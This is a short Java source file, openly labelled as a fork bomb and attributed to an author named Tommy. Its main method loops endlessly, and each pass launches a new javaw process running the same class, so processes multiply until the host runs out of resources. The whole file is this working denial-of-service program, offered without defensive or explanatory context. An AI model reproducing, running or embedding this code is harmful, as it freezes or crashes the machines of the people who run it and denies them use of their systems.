// Fork Bomb - java version
//
// Author: Tommy
// Date: 2009-10-03 18:50


public class ForkBomb
{
	public static void main(String[] args)
	{
		while(true)
		{
			Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), "ForkBomb"});
		}
	}
}
